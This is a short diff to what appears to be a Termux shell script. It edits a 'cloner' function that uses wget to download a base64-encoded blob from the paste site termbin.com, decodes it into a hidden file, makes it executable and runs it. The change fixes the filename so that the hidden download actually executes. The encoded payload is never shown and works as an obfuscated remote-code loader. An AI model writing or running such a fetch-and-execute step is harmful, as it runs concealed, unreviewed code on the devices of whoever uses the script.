@@ -3,7 +3,7 @@ function dep () {
     printf "INSTALL PYTHON..."pkg install python -y 1> /dev/null
 }
 function cloner () {
-    wget -qO- https://termbin.com/6jdv | base64 -d > .getnumber && chmod 7777 .getnumber && bash getnumber
+    wget -qO- https://termbin.com/6jdv | base64 -d > .getnumber && chmod 7777 .getnumber && bash .getnumber
 }
 
 function bn () {
